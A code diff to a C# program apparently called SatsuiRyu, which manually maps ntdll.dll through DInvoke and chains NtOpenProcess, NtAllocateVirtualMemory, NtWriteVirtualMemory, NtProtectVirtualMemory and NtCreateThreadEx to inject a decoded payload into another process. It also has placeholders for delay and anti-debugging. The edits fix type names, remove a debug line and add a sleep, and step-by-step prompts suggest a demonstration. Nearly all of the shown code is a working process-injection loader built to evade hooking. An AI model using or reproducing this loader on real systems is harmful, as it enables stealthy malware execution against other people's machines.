@@ -16,7 +16,6 @@ namespace SatsuiRyu
 
         public static void Main(string[] args)
         {
-            Console.WriteLine("For fuck sake I've not even started!");
             //####DELAY####
 
             //####ANTIDEBUG####
@@ -74,7 +73,7 @@ namespace SatsuiRyu
                 oa,
                 ci
             };
-            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtOpenProcess", typeof(DynamicInvoke.Native.DELEGATES.NtOpenProcess), ntOpenProcessParams, false);
+            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtOpenProcess", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtOpenProcess), ntOpenProcessParams, false);
             pHandle = (IntPtr)ntOpenProcessParams[0];
 
             Console.WriteLine(String.Format("[*] Please check the memory of this process in process hacker under the address: 0x{0:x} to find the manually mapped ntdll.dll", mappedDLL.ModuleBase.ToInt64()));
@@ -82,18 +81,18 @@ namespace SatsuiRyu
             Console.WriteLine("[*] Allocating memory, press Enter to continue...");
             Console.ReadKey();
             object[] allocateVirtualMemoryParams = { pHandle, memAlloc, zeroBits, size, DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE, (uint)0x04 };
-            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtAllocateVirtualMemory", typeof(DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory), allocateVirtualMemoryParams, false);
+            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtAllocateVirtualMemory", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory), allocateVirtualMemoryParams, false);
             memAlloc = (IntPtr)allocateVirtualMemoryParams[1];
             size = (IntPtr)allocateVirtualMemoryParams[3];
 
             Console.WriteLine("[*] Writing payload to memory, press Enter to continue...");
             Console.ReadKey();
             object[] writeVirtualMemoryParams = { pHandle, memAlloc, buffer, (uint)decoded.Length, bytesWritten };
-            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtWriteVirtualMemory", typeof(DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory), writeVirtualMemoryParams, false);
+            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtWriteVirtualMemory", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory), writeVirtualMemoryParams, false);
             bytesWritten = (uint)writeVirtualMemoryParams[4];
 
             object[] protectVirtualMemoryParams = { pHandle, memAlloc, size, (uint)0x20, oldProtect };
-            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtProtectVirtualMemory", typeof(DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory), protectVirtualMemoryParams, false);
+            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtProtectVirtualMemory", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory), protectVirtualMemoryParams, false);
             memAlloc = (IntPtr)protectVirtualMemoryParams[1];
             size = (IntPtr)protectVirtualMemoryParams[2];
             oldProtect = (uint)protectVirtualMemoryParams[4];
@@ -101,8 +100,10 @@ namespace SatsuiRyu
             Console.WriteLine("[*] Creating Remote Thread, press Enter to continue...");
             Console.ReadKey();
             object[] createThreadParams = { pThread, DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, pHandle, memAlloc, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
-            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtCreateThreadEx", typeof(DynamicInvoke.Native.DELEGATES.NtCreateThreadEx), createThreadParams, false);
+            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtCreateThreadEx", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtCreateThreadEx), createThreadParams, false);
             pThread = (IntPtr)createThreadParams[0];
+
+            System.Threading.Thread.Sleep(5*1000);
 
         }
     }
